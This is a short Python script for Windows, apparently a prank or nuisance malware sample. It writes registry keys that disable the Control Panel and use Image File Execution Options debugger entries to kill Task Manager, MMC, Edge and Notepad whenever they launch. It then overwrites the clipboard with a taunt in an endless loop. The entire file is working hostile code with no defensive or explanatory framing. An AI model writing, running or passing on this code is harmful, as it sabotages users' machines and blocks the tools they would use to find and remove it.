import winreg
import pyperclip
import time

#Turns off control panel
key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer")
winreg.SetValueEx(key, "NoControlPanel", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

#Disables a bunch of programs
key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe")
winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, "taskkill /F /IM taskmgr.exe")
winreg.CloseKey(key)

key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe")
winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, "taskkill /F /IM mmc.exe")
winreg.CloseKey(key)

key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe")
winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, "taskkill /F /IM msedge.exe")
winreg.CloseKey(key)

key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe")
winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, "taskkill /F /IM notepad.exe")
winreg.CloseKey(key)


#Overwrites clipboard
while(True):
    pyperclip.copy("No Copying For You!")
    time.sleep(.75)